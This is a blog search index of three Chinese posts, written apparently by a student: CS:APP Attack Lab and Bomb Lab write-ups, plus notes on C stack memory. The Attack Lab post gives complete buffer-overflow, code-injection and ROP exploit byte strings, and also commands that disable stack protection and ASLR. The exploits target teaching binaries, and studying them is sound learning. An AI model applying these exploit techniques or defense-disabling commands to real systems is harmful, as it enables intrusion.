<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>attack_lab记录</title>
    <link href="/2020/07/28/attack-lab%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/07/28/attack-lab%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="attack-lab-实验记录"><a href="#attack-lab-实验记录" class="headerlink" title="attack lab 实验记录"></a>attack lab 实验记录</h1><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><ul><li>了解缓冲溢出攻击</li><li>了解ROP攻击</li><li>熟悉gdb的使用</li><li>进一步学习自动化的插入脚本,加快破解速度</li></ul><h2 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h2><p>实验前需阅读相关章节并仔细阅读指导手册</p><blockquote><p>Your solutions may not use attacks to circumvent the validation code in the programs. Specifically, any address you incorporate into an attack string for use by a ret instruction should be to one of the following destinations: </p><p>– The addresses for functions touch1, touch2, or touch3.</p><p>– The address of your injected code </p><p>– The address of one of your gadgets from the gadget farm.</p><p>These are called exploit strings.  漏洞利用字符</p><p>Both CTARGET and RTARGET take several different command line arguments:</p><p>-h: Print list of possible command line arguments </p><p>-q: Don’t send results to the grading server </p><p>-i FILE: Supply input from a file, rather than from standard input</p></blockquote><p><img src="http://qn.blogyoung.top/20200728101752.png" srcset="/img/loading.gif" alt></p><p>防御的三种手段</p><ul><li>栈随机化  ASLR（内存地址随机化）  heap和local的地址会改变</li><li>栈破坏检测 Stack Protector（栈保护）</li><li>限制可执行代码区 DEP（堆栈不可执行）</li></ul><p>思考:</p><p>1.为什么代码会出现在栈上,他们本应该出现在下面的文本段</p><ul><li>如果未开启栈保护机制,可以直接将我们想要执行的代码加在栈上</li><li>如果开启了栈保护机制,则需要考虑rop,使用程序原本的代码片段(gadgets)</li></ul><p>2.字节序的问题</p><ul><li>除了solar的系统,基本上其他系统都是<code>little-endian</code>字节序，即低位在低地址，高位在高地址。</li><li>我们输入机器码的时候,是从低地址到高地址,所以这里输入前需要转换一下</li></ul><p>课程截图;</p><p><img src="http://qn.blogyoung.top/image-20200728112723025.png" srcset="/img/loading.gif" alt="image-20200728112723025"></p><p><img src="http://qn.blogyoung.top/image-20200728113437138.png" srcset="/img/loading.gif" alt="image-20200728113437138"></p><p>上述两张图说明了两个问题:</p><ul><li><p>返回地址是绝对地址,而不是像jmp和call一样的相对地址,因此也方便插入自己的代码地址</p></li><li><p>x64系统把%rip设置为不可见了,但是任然是按照顺序执行,具体的操作准备后续了解</p></li></ul><p>实验时,需要知道缓冲区的大小,需要用gdb进行反汇编查看分配的空间</p><p><img src="http://qn.blogyoung.top/image-20200728155356611.png" srcset="/img/loading.gif" alt="image-20200728155356611"></p><p>同理,通过此方法查看每一个函数的入口地址</p><h2 id="3-解题过程"><a href="#3-解题过程" class="headerlink" title="3.解题过程"></a>3.解题过程</h2><h3 id="level1-注意点"><a href="#level1-注意点" class="headerlink" title="level1 注意点"></a>level1 注意点</h3><blockquote><p>• All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p></blockquote><p>答案:</p><div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 00 00 00 00  /* this address is touch1 , return to touch1 then success*/</code></pre></div><h3 id="level2-注意点"><a href="#level2-注意点" class="headerlink" title="level2 注意点"></a>level2 注意点</h3><blockquote><p>• You will want to position a byte representation of the address of your injected code in such a way that<br>ret instruction at the end of the code for getbuf will transfer control to it.<br>• Recall that the first argument to a function is passed in register %rdi.<br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer<br>control to the first instruction in touch2.<br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination<br>addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of<br>control, even when you are not returning from a call.<br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of<br>instruction sequences.</p></blockquote><p>这里第3点很有意思,不建议用jmp或call指令,因为他们的跳转采用相对地址,所以会造成麻烦的计算.我们需要用ret指令来进行重定向</p><p>将正常的返回地址设置为注入代码的地址,为了方便选择栈顶注入,</p><blockquote><p>test -&gt; getBuf -&gt;touch2(pass cookie)</p></blockquote><p>构造%rdi和返回地址</p><div class="hljs"><pre><code class="hljs assembly">movq $0x  ,%rdi  //将cookie赋值给%rdipush //touch2的地址ret</code></pre></div><p>转换成汇编代码,然后求出栈顶位置,将返回地址覆盖为栈顶位置即可</p><p>答案:</p><div class="hljs"><pre><code class="hljs assembly">48 c7 c7 fa 97 b9 59 68  /* mov $0x59b99fa, %rdi , 68-00 pushq $0x4017ec */ec 17 40 00 c3 00 00 00  /* c3 retq */00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00  /* move to the top of the stack to run the injected code */</code></pre></div><h3 id="Level3-注意点"><a href="#Level3-注意点" class="headerlink" title="Level3 注意点"></a>Level3 注意点</h3><blockquote><p>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”</p><p>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</p><p>• Your injected code should set register %rdi to the address of this string. </p><p>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</p></blockquote><p>执行流程</p><blockquote><p>test -&gt; getBuf -&gt; touch3 -&gt; hexmatch -&gt; touch3</p></blockquote><p>这里由于在调用hexmath时,随机的字符指针可能会覆盖我们插入的字符,因此我们需要将字符插入父函数的栈帧</p><div class="hljs"><pre><code class="hljs assembly">movq $0x , %rdi   //将字符串指针赋值给%rdipush $0x//将此处的地址压入栈ret</code></pre></div><p>答案:</p><div class="hljs"><pre><code class="hljs assembly">48 c7 c7 a8 dc 61 55 68/* mov 0x5561dca0 to %rdi ,the address of string */fa 18 40 00 c3 00 00 00 /* push 0x4018fa , the address of touch3  */00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 /* return to the top of stack */35 39 62 39 39 37 66 61/* the cookie string  */00</code></pre></div><hr><p>ROP攻击</p><p>以<code>ret</code>结尾的一段指令序列，我们称之为<code>gadget</code>。栈随机化后,只有代码段和全局变量段的位置不会改变,本题中,我们可以找到代码段的某些位置,将我们注入的代码重定向到这些代码中, <strong>这是一种替换程序计数器的方法</strong>,我们不能手动赋值给%rip,但是可以使用ret指令,将%rip定位到我们想要执行的地方,我们需要放入几个小段的组合代码,目的是找到程序中的gadget,即最后一个一个字节为C3的指令</p><p>这里有两点需要注意:</p><p>1.stack空间随机化,无法获取stack的首地址</p><p>2.无法执行stack上的指令</p><h3 id="level4-注意点"><a href="#level4-注意点" class="headerlink" title="level4 注意点"></a>level4 注意点</h3><blockquote><p>•You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” </p><p>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need. </p><p>• Your injected code should set register %rdi to the address of this string. </p><p>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</p></blockquote><p>答案:</p><div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  /* when finish input ,the ret to what we input the next line,and the stack to the line of fa */ab 19 40 00 00 00 00 00  /* the address of pop %rax */fa 97 b9 59 00 00 00 00 /* mov 0x59b997fa to %rax */a2 19 40 00 00 00 00 00  /* the address of mov %rax,%rdi  */ec 17 40 00 00 00 00 00  /* return to the address of touch2  */</code></pre></div><h3 id="level5-注意点"><a href="#level5-注意点" class="headerlink" title="level5 注意点"></a>level5 注意点</h3><p><img src="http://qn.blogyoung.top/image-20200728154530020.png" srcset="/img/loading.gif" alt="image-20200728154530020"></p><blockquote><p>•All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm. </p><p>• You can do this attack with just two gadgets. </p><p>• When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p></blockquote><p>思考:</p><p>1.为什么需要指令来计算cookie的地址,而不能直接赋值??</p><p>-&gt;因为我们是不知道%rsp的地址的</p><p>2.那如何间接获得字符串的地址??</p><p>-&gt;通过基址加偏移来计算 刚好用到lea指令</p><p>3.如何给寄存器赋立即值??</p><p>-&gt;由于我们不能执行指令,只能通过需pop指令来间接赋值 ,如pop %rax</p><p>4.如何查找所需要的片段??</p><p>-&gt;根据writeup查找,里面包含了各种指令的x64机器码</p><p>5.有没有什么捷径??</p><p>-&gt;没有,虽然题目是设计好的,但也需要拼凑很多代码片段,实际破解,也是需要不断地尝试,才有可能改变地址</p><p>答案:</p><div class="hljs"><pre><code class="hljs assembly">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00   /* padding */06 1a 40 00 00 00 00 00   /* movq %rsp,%rax */a2 19 40 00 00 00 00 00  /* movq %rax,%rdi */ab 19 40 00 00 00 00 00  /* pop %rax */48 00 00 00 00 00 00 00  /* 48 */dd 19 40 00 00 00 00 00   /* movl %eax,%edx */34 1a 40 00 00 00 00 00   /* movl %edx,%ecx */ 13 1a 40 00 00 00 00 00  /* movl %ecx,%esi */ d6 19 40 00 00 00 00 00  /* lea (rdi,rsi,1),%rax */a2 19 40 00 00 00 00 00   /* movq %rax,%rdi */fa 18 40 00 00 00 00 00   /* return to touch3 */35 39 62 39 39 37 66 61   /*  */00</code></pre></div><p>参考表格:</p><p><img src="http://qn.blogyoung.top/image-20200728154632359.png" srcset="/img/loading.gif" alt="image-20200728154632359"></p><h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4.其他"></a>4.其他</h2><div class="hljs"><pre><code class="hljs shell">自己创建漏洞程序的一些指令1.关闭栈保护机制-fno-stack-protector 2.关闭保护栈执行机制-z execstack3.关闭ASLRsudo -secho 0&gt;/proc/sys/kernal/randomize_va_spaceexit4.开启core dumpulimit -c unlimitedsudo sh -c 'echo "/tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'5.不生成CFI指令-fno-asynchronous-unwind-tables6.不做任何优化处理-O1</code></pre></div><p>参考记录:</p><p><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官方writeup</a></p><p><a href="https://mcginn7.github.io/2020/02/19/CSAPP-attacklab/" target="_blank" rel="noopener">mcginn博客</a></p>]]></content>
    
    
    <categories>
      
      <category>csapp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-lab -汇编 -ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp Boom_lab 实验记录</title>
    <link href="/2020/07/27/boom_lab%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/07/27/boom_lab%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Bomb-lab-实验记录"><a href="#Bomb-lab-实验记录" class="headerlink" title="Bomb lab 实验记录"></a>Bomb lab 实验记录</h1><h2 id="1-目的"><a href="#1-目的" class="headerlink" title="1.目的"></a>1.目的</h2><ul><li>掌握x86汇编语言</li><li>学会用gdb调试程序</li><li>理解一些基础数据结构的汇编表示方法</li></ul><h2 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h2><p>做实验前先阅读writeup,在准备工具</p><p>由于时间关系,我只详细记录最后两题的解题思路</p><h3 id="1-Summary-of-GDB"><a href="#1-Summary-of-GDB" class="headerlink" title="1.Summary of GDB"></a>1.Summary of GDB</h3><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Summary.html#Summary" target="_blank" rel="noopener">https://sourceware.org/gdb/current/onlinedocs/gdb/Summary.html#Summary</a></p><p><a href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf" target="_blank" rel="noopener">http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf</a></p><ul><li><code>print</code>，可显示变量的值</li><li><code>info</code>，可显示寄存器的值</li><li><code>x</code>，可显示内存值，examining的简写</li></ul><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>p  [variable]@length</td><td>打印变量值 或者打印变量数组</td></tr><tr><td>info [register|stack|frame]</td><td>查看运行时的各种属性</td></tr><tr><td>x / [register]</td><td>查看地址</td></tr></tbody></table><table><thead><tr><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>x</td><td>十六进制</td></tr><tr><td>d</td><td>十进制</td></tr><tr><td>u</td><td>无符号数</td></tr><tr><td>o</td><td>八进制</td></tr><tr><td>t</td><td>二进制数</td></tr><tr><td>a</td><td>地址</td></tr><tr><td>c</td><td>ascii吗</td></tr><tr><td>f</td><td>浮点数</td></tr><tr><td>s</td><td>字符串</td></tr><tr><td>i</td><td>机器语言</td></tr></tbody></table><h3 id="2-cgdb的下载-这里用cgdb的图形界面比较方便"><a href="#2-cgdb的下载-这里用cgdb的图形界面比较方便" class="headerlink" title="2.cgdb的下载,这里用cgdb的图形界面比较方便"></a>2.cgdb的下载,这里用cgdb的图形界面比较方便</h3><p>cgdb安装</p><p>注意看readme</p><div class="hljs"><pre><code class="hljs shell">git clone git://github.com/cgdb/cgdb.gitcd cgdbsudo apt install automake autoconf./autogen.shsudo apt install libreadline-dev libncurses5-dev libncursesw5-dev flex textinfo./configure --prefix=/usr/localmakesudo make install</code></pre></div><p>配置文件：</p><blockquote><p>  ~/.cgdb/cgdbrc</p></blockquote><div class="hljs"><pre><code class="hljs rc">set ignorecaseset ts=4set wso=verticalset eld=shortarrowset hlsmap &lt;F9&gt; :until&lt;cr&gt;</code></pre></div><h3 id="3-查看每次输入数据的格式"><a href="#3-查看每次输入数据的格式" class="headerlink" title="3.查看每次输入数据的格式"></a>3.查看每次输入数据的格式</h3><p>查看输入格式.这里查看</p><div class="hljs"><pre><code class="hljs assembly">400f51:be cf 25 40 00       mov    $0x4025cf,%esi400f56:b8 00 00 00 00       mov    $0x0,%eax400f5b:e8 90 fc ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;当需要格式化输入的时候,查看$esi的值</code></pre></div><h2 id="2-实验记录"><a href="#2-实验记录" class="headerlink" title="2.实验记录"></a>2.实验记录</h2><p>第6题 </p><p>阅读汇编代码，有几个关键的点需要仔细琢磨</p><p>1.双层循环  明白内层和外层的不同作用</p><div class="hljs"><pre><code class="hljs assembly">40114d:49 83 c5 04          add    $0x4,%r13401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt; #外循环</code></pre></div><p>2.循环减7</p><div class="hljs"><pre><code class="hljs assembly">401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi401158:4c 89 f0             mov    %r14,%rax40115b:b9 07 00 00 00       mov    $0x7,%ecx401160:89 ca                mov    %ecx,%edx401162:2b 10                sub    (%rax),%edx401164:89 10                mov    %edx,(%rax)401166:48 83 c0 04          add    $0x4,%rax40116a:48 39 f0             cmp    %rsi,%rax40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;40116f:be 00 00 00 00       mov    $0x0,%esi401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;</code></pre></div><p>3.根据索引查找链表</p><div class="hljs"><pre><code class="hljs assembly">401176:48 8b 52 08          mov    0x8(%rdx),%rdx</code></pre></div><blockquote><p>上面为最关键的一行,也是确定数据结构的一行,根据这一行我们推测这题是一个链表结构,每一个链表节点有一个成员变量是一个指向下一个链表节点的指针,我们便能根据地址打印相关数据</p><p>例如: x/24xw 0x6032d0 打印链表的结构  表示打印24个单元,以十六进制,单元大小为4字节</p></blockquote><p><img src="http://qn.blogyoung.top/image-20200726235359082.png" srcset="/img/loading.gif" alt="image-20200726235359082"></p><p><img src="http://qn.blogyoung.top/image-20200726235341162.png" srcset="/img/loading.gif" alt="image-20200726235341162"></p><p>在进行链表节点地址重排后,可以查看<code>%rsp+0x20</code>处后面的数组结构,发现是按照我们传入的数据进行节点地址的排序.</p><p><img src="http://qn.blogyoung.top/image-20200726235429574.png" srcset="/img/loading.gif" alt="image-20200726235429574"></p><p>最后一步为比较大小,按照value值降序排列,否则触发bomb,综上分析,我们根据汇编写一下类似的C源码</p><div class="hljs"><pre><code class="hljs assembly">/* structure node */struct node&#123;int value; // 某四字节内容int order; // 原来节点的顺序 struct node* next; // 下一个node地址&#125; ;/*C code in phtase 6*/void phase_7(......)&#123;//part1int i;for(i=0;i&lt;6;i++)&#123;int tmp = intarray[i];if(tmp&gt;6) callbomb();  //每个数必须小于6for(;i&lt;6;i++)&#123; if(tmp=intarray[i]) callbomb(); 每个数都不相同&#125;&#125;//part2for(i=0;i&lt;6;i++)&#123;intarray[i]=7-intarray[i];&#125;//part3 找到节点地址，并排序struct node node*;node* nodearray[6];int tmpb;for(i=0;i&lt;6;i++)&#123;tmp = intarray[i];for(tmpb=0;tmpb&lt;tmp;tmpb++)&#123;node=node-&gt;next;&#125;nodearray[i]=node;&#125;//part4 重新排列node的下一个索引地址，注意最后一个节点的下一个索引为0for(i=0;i&lt;5;i++)&#123;node = nodearray[i];node-&gt;next = nodearray[i+1];&#125;nodearray[i]=0;  //最后一个节点置零//part5 比较大小，只需要比较5次for(i=0;i&lt;5;i++)&#123;node = nodearray[i];if(node.value&lt;node-&gt;next.value) call_bomb();&#125;&#125;</code></pre></div><p>第7题:</p><p>本lab还有一个彩蛋关卡.</p><p>在defuse的两处设置断点,可以看出在<code>0x4015d8</code>出,会对<code>0x6</code>和<code>0x202181(%rsp)</code>进行对比,这里我们发现每解开一个程序后者会加1,所以解完前6个炸弹后,才会进入下面的判断代码</p><p><img src="http://qn.blogyoung.top/image-20200727140906973.png" srcset="/img/loading.gif" alt="image-20200727140906973"></p><p>进入判断后,发现是用第四题的输入做判断 我们修改第四题的输入 即进入了彩蛋关卡</p><p><img src="http://qn.blogyoung.top/image-20200727141516651.png" srcset="/img/loading.gif" alt="image-20200727141516651"></p><p>进入后,我们打印在<code>0x6030f0</code>处的值 发现是一个二叉树结构</p><p><img src="http://qn.blogyoung.top/image-20200727150203195.png" srcset="/img/loading.gif" alt="image-20200727150203195"></p><p>二叉树结构</p><p><img src="http://qn.blogyoung.top/image-20200727152139222.png" srcset="/img/loading.gif" alt="image-20200727152139222"></p><p>根据fun7的汇编,转换成C语言的代码</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">//node pointer in %rdi,value in %rsi,return_value in %rax </span><span class="hljs-comment">//require %rax to be 2</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fun7</span><span class="hljs-params">(Node* node,<span class="hljs-keyword">int</span> value)</span></span>&#123;  <span class="hljs-keyword">if</span>(value == <span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  &#125;  <span class="hljs-keyword">int</span> v = addr-&gt;value;  <span class="hljs-keyword">if</span>( v &lt; value)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + <span class="hljs-number">2</span>*fun7(addr-&gt;right,value);  &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v == value)&#123;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*func7(addr-&gt;left,value);  &#125;&#125;</code></pre></div><p>根据递归关系 ,我们要获得2的结果,则关系式为2<code>*</code>(1+2*0),则输入值为22或20</p><p>以上为最后两题解析,获得了很多收获</p><p>最后截个图:</p><p><img src="http://qn.blogyoung.top/image-20200727152251984.png" srcset="/img/loading.gif" alt="image-20200727152251984"></p><p>以上记录方便以后查看.</p>]]></content>
    
    
    <categories>
      
      <category>csapp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-lab -C -汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于c语言及其内存的一些记录</title>
    <link href="/2020/07/22/%E5%85%B3%E4%BA%8Ec%E8%AF%AD%E8%A8%80%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/07/22/%E5%85%B3%E4%BA%8Ec%E8%AF%AD%E8%A8%80%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>今天看csapp第9章，该章最后列举了常见内存问题的列表，其中有一项是关于局部变量问题，我简单拓展一下该问题。</p><p>这是一个最简单的函数调用例子</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*demo1.c一个正常的程序*/</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;    <span class="hljs-keyword">int</span> c = a+b;    <span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">int</span> result;    result=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);&#125;</code></pre></div><p>我们将上述代码中的sum函数改写成汇编的形式</p><div class="hljs"><pre><code class="hljs assembly">/* sum: a in %rdi ,b in %rsi , c in %rax*/movq %rdi %rax  // c=aaddq %rsi %rax// c=a+bretq// return c</code></pre></div><p>上面的代码根据以下两点知识：</p><p>1.程序在编译时，编译器不会为局部变量创建空间</p><p>2.程序运行时,局部变量在没有引用其地址时，且局部变量个数不大于保存变量寄存器的个数时，会将局部变量直接保存在寄存器中，节省数据拷贝的时间和内存空间</p><p>我们现在将代码改一下</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*demo2.c有bug的程序*/</span><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;    <span class="hljs-keyword">int</span> c = a+b;    <span class="hljs-keyword">return</span> &amp;c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">int</span> result;    result=sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);&#125;</code></pre></div><p>上面的程序在编译时,会报如下错误</p><blockquote><p>warning: function returns address of local variable [-Wreturn-local-addr]</p></blockquote><p>我们用汇编语言来表示以下sum函数,这里省略一些寄存器的保存操作</p><div class="hljs"><pre><code class="hljs assembly">/* sum: a in %rdi ,b in %rsi , c in %rdx , &amp;c in %rax*/movq %rdi %rdx  // c=aaddq %rsi %rdx// c=a+bpush %rdx//将变量压入栈movq %rsp %rax  //retq// return &amp;c</code></pre></div><p>上面的代码根据以下两点知识：</p><p>1.由于程序引用了变量的地址,且为局部变量,所以要把局部变量压入栈中,并获得其在栈中的变量地址</p><p>2.程序从sum返回时,将会改变%rbp的值(此处未列出,具体可查表),使得sum函数所分配的所有局部变量被释放.编译器在编译时,会发现该错误并终止编译</p><p>我们也可以看一下书上的解释</p><p><img src="https://i.loli.net/2020/07/22/znJyCb3HAZ6l9u2.jpg" srcset="/img/loading.gif" alt="cerror"></p><p>明白了上述解释，就能明白局部变量的使用问题。现在gcc编译时就能检查出该问题。</p><p>继续修改一下代码</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*demo3.c有bug的程序*/</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> * result)</span></span>&#123;    <span class="hljs-keyword">int</span> c = a+b;* result =c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">int</span> * result;    sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,result);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"result = %d\n"</span>,*result);&#125;</code></pre></div><p>程序在编译时会有如下错误：</p><blockquote><p>Segmentation fault (core dumped)</p></blockquote><p>这里需要搞清楚变量声明和定义，当声明一个基本类型的变量时(C里面没有这个概念，可以理解为除了数组，结构体和联合以外的变量)，编译器也不会为他分配空间。只有在定义的时候，也就是为变量赋值的时候，才会分配给该变量空间(这里的局部变量用到了指针,赋值时按上面的规则,会将变量保存在栈中) 。如果要修改上面的程序，可以将result声明为一个数的数组，当然实际中，会优化代码结构。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*demo4.c一种简单的修改方式*/</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> * result)</span></span>&#123;    <span class="hljs-keyword">int</span> c = a+b;* result =c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">int</span> result[<span class="hljs-number">1</span>];    sum(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,result);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"result = %d\n"</span>,*result);&#125;</code></pre></div><p>我们接着写一个书上的问题，关于动态分配栈空间</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">//demo5.c</span><span class="hljs-comment">/*n:创建的变长二维数组的长度idx:用来返回索引q:用来记录地址*/</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vframe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n,<span class="hljs-keyword">int</span> idx,<span class="hljs-keyword">int</span> *q)</span></span>&#123;    <span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;    <span class="hljs-keyword">int</span> *p[n];    p[<span class="hljs-number">0</span>] = &amp;i;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)        p[i] = q;    <span class="hljs-keyword">return</span> *p[idx];&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>&#123;    <span class="hljs-keyword">int</span> length=<span class="hljs-number">5</span>;<span class="hljs-keyword">int</span> ida=<span class="hljs-number">2</span>;<span class="hljs-keyword">int</span> t =<span class="hljs-number">3</span>;    <span class="hljs-keyword">int</span> a = vframe (length, ida,&amp;t);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"return value %d\n"</span>, a);&#125;</code></pre></div><p>由于局部变量在编译时，编译器不会为其分配空间，因此，如果要分配一个动态的数组，一种方法如上所示，我们可以传入数组的大小，在内部进行一些计算后，返回结果。我们用objdump查看一下源码</p><div class="hljs"><pre><code class="hljs assembly">/*int vframe(int n,int idx,int *q)n in rdi , idx in rsi, q in rdx*/00000000000006da &lt;vframe&gt;: 6da:55                   push   %rbp 6db:48 89 e5             mov    %rsp,%rbp 6de:48 83 ec 10          sub    $0x10,%rsp 6e2:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax 6e9:00 00  6eb:48 89 45 f8          mov    %rax,-0x8(%rbp) 6ef:31 c0                xor    %eax,%eax 6f1:48 63 c7             movslq %edi,%rax 6f4:48 8d 04 c5 16 00 00 lea    0x16(,%rax,8),%rax 6fb:00  6fc:48 83 e0 f0          and    $0xfffffffffffffff0,%rax 700:48 29 c4             sub    %rax,%rsp 703:48 8d 44 24 07       lea    0x7(%rsp),%rax 708:48 c1 e8 03          shr    $0x3,%rax 70c:4c 8d 04 c5 00 00 00 lea    0x0(,%rax,8),%r8 713:00  714:4c 89 c1             mov    %r8,%rcx 717:4c 8d 4d f4          lea    -0xc(%rbp),%r9 71b:4c 89 0c c5 00 00 00 mov    %r9,0x0(,%rax,8) 722:00  723:c7 45 f4 00 00 00 00 movl   $0x0,-0xc(%rbp) 72a:eb 0a                jmp    736 &lt;vframe+0x5c&gt; 72c:48 98                cltq    72e:48 89 14 c1          mov    %rdx,(%rcx,%rax,8) 732:83 45 f4 01          addl   $0x1,-0xc(%rbp) 736:8b 45 f4             mov    -0xc(%rbp),%eax 739:39 f8                cmp    %edi,%eax 73b:7c ef                jl     72c &lt;vframe+0x52&gt; 73d:48 63 f6             movslq %esi,%rsi 740:49 8b 04 f0          mov    (%r8,%rsi,8),%rax 744:8b 00                mov    (%rax),%eax 746:48 8b 75 f8          mov    -0x8(%rbp),%rsi 74a:64 48 33 34 25 28 00 xor    %fs:0x28,%rsi 751:00 00  753:75 02                jne    757 &lt;vframe+0x7d&gt; 755:c9                   leaveq  756:c3                   retq    757:e8 44 fe ff ff       callq  5a0 